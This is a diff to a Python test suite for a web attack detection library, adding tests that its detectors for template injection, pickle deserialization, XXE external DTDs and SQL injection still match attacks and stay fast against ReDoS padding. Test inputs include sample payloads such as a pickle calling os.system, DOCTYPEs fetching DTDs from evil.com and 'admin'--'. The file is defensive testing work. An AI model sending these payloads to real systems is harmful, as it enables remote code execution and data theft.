@@ -9,27 +9,37 @@ import pytest
 
 from guard_core.detection_engine.compiler import PatternCompiler
 from guard_core.handlers.suspatterns_handler import (
+    _BUILTIN_PATTERN_COMPILE_FLAGS,
     _CMD_INJECTION_DOLLAR_SUBSTITUTION_RE,
     _DEFAULT_MAX_SCAN_LENGTH,
+    _DESERIALIZATION_PICKLE_GLOBAL_GENERIC_COMPILED_RE,
     _FILE_UPLOAD_DOUBLE_EXTENSION_RE,
     _GLOB_WILDCARD_ATOM_RE,
-    _KNOWN_QUADRATIC_BUILTIN_PATTERNS_PENDING_B_XQ_FIX,
-    _MEASUREMENT_BORDERLINE_BUILTIN_PATTERNS,
     _PATTERN_SCAN_WINDOW_MATCHERS,
     _SCAN_WINDOW_PATTERNS,
     _SQLI_LOAD_FILE_RE,
+    _TEMPLATE_ASP_KEYWORD_RE,
     _TEMPLATE_CURLY_CALL_RE,
     _TEMPLATE_CURLY_KEYWORD_RE,
     _TEMPLATE_DOLLAR_BRACE_CALL_RE,
+    _TEMPLATE_PERCENT_KEYWORD_RE,
     _WINDOWED_PATTERN_FINDERS,
+    _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE,
+    _XML_XXE_PUBLIC_EXTERNAL_DTD_RE,
     SusPatternsManager,
     _cmd_injection_dollar_scan_matches,
     _file_upload_double_extension_scan_matches,
     _glob_wildcard_scan_matches,
     _load_file_scan_matches,
+    _pickle_global_generic_finditer,
+    _template_asp_keyword_scan_matches,
     _template_curly_call_scan_matches,
     _template_curly_keyword_scan_matches,
     _template_dollar_brace_scan_matches,
+    _template_percent_keyword_scan_matches,
+    _xml_xxe_candidate_span,
+    _xml_xxe_public_external_dtd_finditer,
+    _xml_xxe_scheme_completion_end,
 )
 
 IM = re.IGNORECASE | re.MULTILINE
@@ -79,6 +89,8 @@ _SCAN_WINDOW_MATCHERS = {
     "_template_curly_keyword_scan_matches": _template_curly_keyword_scan_matches,
     "_template_dollar_brace_scan_matches": _template_dollar_brace_scan_matches,
     "_template_curly_call_scan_matches": _template_curly_call_scan_matches,
+    "_template_percent_keyword_scan_matches": _template_percent_keyword_scan_matches,
+    "_template_asp_keyword_scan_matches": _template_asp_keyword_scan_matches,
     "_glob_wildcard_scan_matches": _glob_wildcard_scan_matches,
 }
 
@@ -272,7 +284,7 @@ def test_union_select_null_still_matches_real_sqli() -> None:
 
 
 def test_quote_comment_matches_authentication_bypass() -> None:
-    rx = _compiled("sqli", r"'\s*[\);]*\s*--|'[\);]*#(?:\n|\Z)")
+    rx = _compiled("sqli", r"'\s*(?:[\);]+\s*)?--|'[\);]*#(?:\n|\Z)")
     assert rx.search("admin'--")
     assert rx.search("1'--")
     assert rx.search("admin'#")
@@ -282,7 +294,7 @@ def test_quote_comment_matches_authentication_bypass() -> None:
 
 
 def test_quote_comment_ignores_quoted_fragments_and_prose() -> None:
-    rx = _compiled("sqli", r"'\s*[\);]*\s*--|'[\);]*#(?:\n|\Z)")
+    rx = _compiled("sqli", r"'\s*(?:[\);]+\s*)?--|'[\);]*#(?:\n|\Z)")
     assert not rx.search("document.querySelector('#app')")
     assert not rx.search("href='#top'")
     assert not rx.search("I'll select a few items from the catalog")
@@ -859,6 +871,369 @@ def test_template_curly_call_resists_repeated_literal_padding() -> None:
     )
 
 
+def test_template_percent_keyword_still_matches_real_attack() -> None:
+    compiled = re.compile(_TEMPLATE_PERCENT_KEYWORD_RE, re.IGNORECASE)
+    assert _template_percent_keyword_scan_matches("{% x;system %}", compiled)
+    assert not _template_percent_keyword_scan_matches("{% name %}", compiled)
+
+
+def test_template_percent_keyword_detects_padding_past_old_256_cap() -> None:
+    compiled = re.compile(_TEMPLATE_PERCENT_KEYWORD_RE, re.IGNORECASE)
+    padding = "b " * 130
+    text = "{% " + padding + "system %}"
+    assert len(padding) > 256
+    assert _template_percent_keyword_scan_matches(text, compiled)
+
+
+def test_template_percent_keyword_detects_padding_past_4096_chars() -> None:
+    compiled = re.compile(_TEMPLATE_PERCENT_KEYWORD_RE, re.IGNORECASE)
+    padding = "b " * 2049
+    text = "{% " + padding + "system %}"
+    assert len(padding) > 4096
+    assert _template_percent_keyword_scan_matches(text, compiled)
+
+
+def test_template_percent_keyword_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        prefix = "{% "
+        return (prefix + "a" * n)[:n]
+
+    texts = [mk(n) for n in sizes]
+    _assert_scan_window_linear_and_fast(
+        lambda: _timed_scan_window_batch(
+            "_template_percent_keyword_scan_matches",
+            _TEMPLATE_PERCENT_KEYWORD_RE,
+            texts,
+            timeout=4.0,
+        ),
+        "template percent keyword",
+    )
+
+
+def test_template_asp_keyword_still_matches_real_attack() -> None:
+    compiled = re.compile(_TEMPLATE_ASP_KEYWORD_RE, re.IGNORECASE)
+    assert _template_asp_keyword_scan_matches('<%eval("x")%>', compiled)
+    assert _template_asp_keyword_scan_matches("<% Runtime.getRuntime() %>", compiled)
+    assert not _template_asp_keyword_scan_matches("<%= name %>", compiled)
+
+
+def test_template_asp_keyword_detects_padding_past_old_256_cap() -> None:
+    compiled = re.compile(_TEMPLATE_ASP_KEYWORD_RE, re.IGNORECASE)
+    padding = "b " * 130
+    text = "<%" + padding + "eval%>"
+    assert len(padding) > 256
+    assert _template_asp_keyword_scan_matches(text, compiled)
+
+
+def test_template_asp_keyword_detects_padding_past_4096_chars() -> None:
+    compiled = re.compile(_TEMPLATE_ASP_KEYWORD_RE, re.IGNORECASE)
+    padding = "b " * 2049
+    text = "<%" + padding + "eval%>"
+    assert len(padding) > 4096
+    assert _template_asp_keyword_scan_matches(text, compiled)
+
+
+def test_template_asp_keyword_resists_repeated_literal_padding() -> None:
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        prefix = "<%"
+        return (prefix + "a" * n)[:n]
+
+    texts = [mk(n) for n in sizes]
+    _assert_scan_window_linear_and_fast(
+        lambda: _timed_scan_window_batch(
+            "_template_asp_keyword_scan_matches",
+            _TEMPLATE_ASP_KEYWORD_RE,
+            texts,
+            timeout=4.0,
+        ),
+        "template asp keyword",
+    )
+
+
+def test_pickle_global_generic_finditer_still_matches_real_attack() -> None:
+    text = "cos\nsystem\np0\n(S'id'\ntR."
+    matches = list(
+        _pickle_global_generic_finditer(
+            text, _DESERIALIZATION_PICKLE_GLOBAL_GENERIC_COMPILED_RE
+        )
+    )
+    assert matches
+    assert matches[0].group() == "cos\nsystem\np0\n(S'id'\ntR"
+
+
+def test_pickle_global_generic_finditer_resists_no_newline_anchor_flood() -> None:
+    text = "c" * 80000
+
+    def _check() -> None:
+        samples = []
+        for _ in range(5):
+            start = time.process_time()
+            list(
+                _pickle_global_generic_finditer(
+                    text, _DESERIALIZATION_PICKLE_GLOBAL_GENERIC_COMPILED_RE
+                )
+            )
+            samples.append(time.process_time() - start)
+        assert min(samples) < 0.05, (
+            f"pickle GLOBAL finder exceeded 50ms on an 80k-char anchor flood "
+            f"with no newline: {samples}"
+        )
+
+    _assert_after_one_retry(_check)
+
+
+def test_pickle_global_generic_finditer_detects_longest_pattern_allowed_module() -> (
+    None
+):
+    module = ".".join("m" + "a" * 98 for _ in range(20))
+    name = "n" + "b" * 98
+    text = f"c{module}\n{name}\np0\n(S'id'\ntR."
+    matches = list(
+        _pickle_global_generic_finditer(
+            text, _DESERIALIZATION_PICKLE_GLOBAL_GENERIC_COMPILED_RE
+        )
+    )
+    assert matches
+    assert matches[0].group().startswith(f"c{module}\n{name}\n")
+
+
+def test_pickle_global_generic_finditer_detects_within_8192_char_opcode_line() -> None:
+    attack = "cos\nsystem\n(S'id'\ntR."
+    padding = "c" * (8192 - len(attack))
+    text = padding + attack
+
+    def _check() -> None:
+        samples = []
+        matches: list[object] = []
+        for _ in range(5):
+            start = time.process_time()
+            matches = list(
+                _pickle_global_generic_finditer(
+                    text, _DESERIALIZATION_PICKLE_GLOBAL_GENERIC_COMPILED_RE
+                )
+            )
+            samples.append(time.process_time() - start)
+        assert matches, "attack past 8192 chars of filler was not detected"
+        assert min(samples) < 0.05, (
+            f"pickle GLOBAL finder exceeded 50ms on an 8192-char opcode line: "
+            f"{samples}"
+        )
+
+    _assert_after_one_retry(_check)
+
+
+def test_pickle_global_generic_finditer_gives_up_past_dotted_segment_cap() -> None:
+    module = ".".join(["m"] * 22)
+    text = f"{module}\nname\n(S'x'\ntR."
+    matches = list(
+        _pickle_global_generic_finditer(
+            text, _DESERIALIZATION_PICKLE_GLOBAL_GENERIC_COMPILED_RE
+        )
+    )
+    assert matches == []
+
+
+def test_xml_xxe_public_external_dtd_finditer_still_matches_real_attack() -> None:
+    text = '<!DOCTYPE foo PUBLIC "-//X//Y" "http://evil.com/x.dtd">'
+    matches = list(
+        _xml_xxe_public_external_dtd_finditer(
+            text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+        )
+    )
+    assert matches
+    assert matches[0].group() == text
+
+
+def test_xml_xxe_public_external_dtd_finditer_ignores_w3_org() -> None:
+    text = (
+        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0//EN" '
+        '"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">'
+    )
+    assert not list(
+        _xml_xxe_public_external_dtd_finditer(
+            text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+        )
+    )
+
+
+def test_xml_xxe_public_external_dtd_finditer_skips_decoy_public_substring() -> None:
+    text = '<!DOCTYPE foo PUBLIC-NOTPUBLIC PUBLIC "-//X//Y" "http://evil.com/a.dtd">'
+    matches = list(
+        _xml_xxe_public_external_dtd_finditer(
+            text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+        )
+    )
+    assert matches
+
+
+def test_xml_xxe_public_external_dtd_finditer_skips_public_inside_matched_span() -> (
+    None
+):
+    text = '<!DOCTYPE a PUBLIC "x" "http://evil/PUBLIC.dtd">'
+    matches = list(
+        _xml_xxe_public_external_dtd_finditer(
+            text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+        )
+    )
+    assert [m.group() for m in matches] == [text]
+
+
+def test_xml_xxe_scheme_completion_end_rejects_scheme_start_at_zero() -> None:
+    assert _xml_xxe_scheme_completion_end("http://x", 0, [], []) is None
+
+
+def test_xml_xxe_scheme_completion_end_rejects_non_quote_before_scheme() -> None:
+    text = 'xhttp://evil.com/a">'
+    assert _xml_xxe_scheme_completion_end(text, 1, [1], [19]) is None
+
+
+def test_xml_xxe_scheme_completion_end_rejects_non_scheme_text() -> None:
+    text = '"nothello'
+    assert _xml_xxe_scheme_completion_end(text, 1, [], []) is None
+
+
+def test_xml_xxe_scheme_completion_end_rejects_w3_org_lookahead() -> None:
+    text = '"http://www.w3.org/a">'
+    assert _xml_xxe_scheme_completion_end(text, 1, [21], [0, 21]) is None
+
+
+def test_xml_xxe_scheme_completion_end_rejects_no_class3_boundary() -> None:
+    text = '"http://evil.com/nothingafter'
+    assert _xml_xxe_scheme_completion_end(text, 1, [], [0]) is None
+
+
+def test_xml_xxe_scheme_completion_end_rejects_class3_stopped_by_gt() -> None:
+    text = '"http://evil.com/a>'
+    assert _xml_xxe_scheme_completion_end(text, 1, [18], [0, 18]) is None
+
+
+def test_xml_xxe_scheme_completion_end_rejects_no_class4_boundary() -> None:
+    text = '"http://evil.com/a"'
+    assert _xml_xxe_scheme_completion_end(text, 1, [], [0, 18]) is None
+
+
+def test_xml_xxe_scheme_completion_end_accepts_full_chain() -> None:
+    text = '"http://evil.com/a">'
+    assert _xml_xxe_scheme_completion_end(text, 1, [19], [0, 18, 19]) == 19
+
+
+def test_xml_xxe_candidate_span_rejects_missing_doctype() -> None:
+    assert _xml_xxe_candidate_span([], [0], {0: 5}, [], 20, 30) is None
+
+
+def test_xml_xxe_candidate_span_rejects_doctype_before_run_start() -> None:
+    assert _xml_xxe_candidate_span([2], [20], {20: 25}, [10], 15, 30) is None
+
+
+def test_xml_xxe_candidate_span_rejects_missing_quote() -> None:
+    assert _xml_xxe_candidate_span([0], [], {}, [], 15, 30) is None
+
+
+def test_xml_xxe_candidate_span_rejects_quote_past_run_end() -> None:
+    assert _xml_xxe_candidate_span([0], [50], {50: 55}, [20], 15, 60) is None
+
+
+def test_xml_xxe_candidate_span_accepts_full_chain() -> None:
+    assert _xml_xxe_candidate_span([0], [25], {25: 30}, [], 15, 40) == (0, 30)
+
+
+@pytest.mark.parametrize(
+    "gap1,gap2,gap3",
+    [
+        (129, 10, 10),
+        (4096, 10, 10),
+        (10, 513, 10),
+        (10, 8192, 10),
+        (10, 10, 129),
+        (10, 10, 4096),
+        (4096, 8192, 4096),
+    ],
+)
+def test_xml_xxe_public_external_dtd_finditer_detects_past_every_old_cap(
+    gap1: int, gap2: int, gap3: int
+) -> None:
+    text = (
+        "<!DOCTYPE"
+        + " " * gap1
+        + "PUBLIC"
+        + " " * gap1
+        + '"-//X//Y" "http://evil.example/'
+        + "a" * gap2
+        + '.dtd"'
+        + " " * gap3
+        + ">"
+    )
+    matches = list(
+        _xml_xxe_public_external_dtd_finditer(
+            text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+        )
+    )
+    assert matches, f"gap1={gap1} gap2={gap2} gap3={gap3} len={len(text)}"
+    assert re.search(_XML_XXE_PUBLIC_EXTERNAL_DTD_RE, text, re.IGNORECASE)
+
+
+def test_xml_xxe_public_external_dtd_finditer_resists_many_doctype_no_terminator() -> (
+    None
+):
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        unit = "<!DOCTYPE" + "0" * 20
+        return (unit * (n // len(unit) + 1))[:n]
+
+    def _check() -> None:
+        for n in sizes:
+            text = mk(n)
+            samples = []
+            for _ in range(5):
+                start = time.process_time()
+                list(
+                    _xml_xxe_public_external_dtd_finditer(
+                        text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+                    )
+                )
+                samples.append(time.process_time() - start)
+            assert min(samples) < 0.05, (
+                f"xml xxe finder exceeded 50ms at n={n} (many doctype, "
+                f"no terminator): {samples}"
+            )
+
+    _assert_after_one_retry(_check)
+
+
+def test_xml_xxe_public_external_dtd_finditer_resists_many_doctype_far_terminator() -> (
+    None
+):
+    sizes = [65536, 131072, 262144]
+
+    def mk(n: int) -> str:
+        unit = "<!DOCTYPE" + "0" * 20
+        return (unit * (n // len(unit) + 1))[:n] + ">"
+
+    def _check() -> None:
+        for n in sizes:
+            text = mk(n)
+            samples = []
+            for _ in range(5):
+                start = time.process_time()
+                list(
+                    _xml_xxe_public_external_dtd_finditer(
+                        text, _XML_XXE_PUBLIC_EXTERNAL_DTD_COMPILED_RE
+                    )
+                )
+                samples.append(time.process_time() - start)
+            assert min(samples) < 0.05, (
+                f"xml xxe finder exceeded 50ms at n={n} (many doctype, "
+                f"far terminator): {samples}"
+            )
+
+    _assert_after_one_retry(_check)
+
+
 def test_glob_wildcard_still_matches_real_attacks() -> None:
     compiled = re.compile(_GLOB_WILDCARD_ATOM_RE, re.IGNORECASE)
     matches = _glob_wildcard_scan_matches("rm -rf /tmp/*.log", compiled)
@@ -903,24 +1278,23 @@ def test_cms_probing_backup_still_matches_multidot_filenames(path: str) -> None:
     assert rx.search(path), f"multi-dot backup probe regressed: {path}"
 
 
+_SAFETY_VALIDATED_PATTERNS_BY_CATEGORY: dict[str, str] = {
+    pat: cat
+    for pat, _ctx, cat in _RAW_SEARCH_SAFE_PATTERN_DEFINITIONS
+}
+
+
 @pytest.mark.redos_timing
-def test_every_builtin_not_in_the_known_quadratic_set_passes_the_safety_validator() -> (
-    None
-):
+@pytest.mark.parametrize(
+    "pat", list(_SAFETY_VALIDATED_PATTERNS_BY_CATEGORY), ids=lambda pat: pat[:40]
+)
+def test_every_raw_search_builtin_passes_the_safety_validator(
+    pat: str,
+) -> None:
     pc = PatternCompiler()
-    bad = []
-    for pat, _c, cat in _RAW_SEARCH_SAFE_PATTERN_DEFINITIONS:
-        if (
-            pat in _KNOWN_QUADRATIC_BUILTIN_PATTERNS_PENDING_B_XQ_FIX
-            or pat in _MEASUREMENT_BORDERLINE_BUILTIN_PATTERNS
-        ):
-            continue
-        ok, reason = pc.validate_pattern_safety(pat)
-        if not ok:
-            bad.append((cat, reason, pat))
-    assert not bad, "built-ins that fail the ReDoS validator:\n" + "\n".join(
-        f"  [{c}] {r} :: {p[:80]}" for c, r, p in bad
-    )
+    ok, reason = pc.validate_pattern_safety(pat, flags=_BUILTIN_PATTERN_COMPILE_FLAGS)
+    cat = _SAFETY_VALIDATED_PATTERNS_BY_CATEGORY[pat]
+    assert ok, f"[{cat}] {reason} :: {pat[:80]}"
 
 
 def _file_inclusion_url_pattern() -> str:
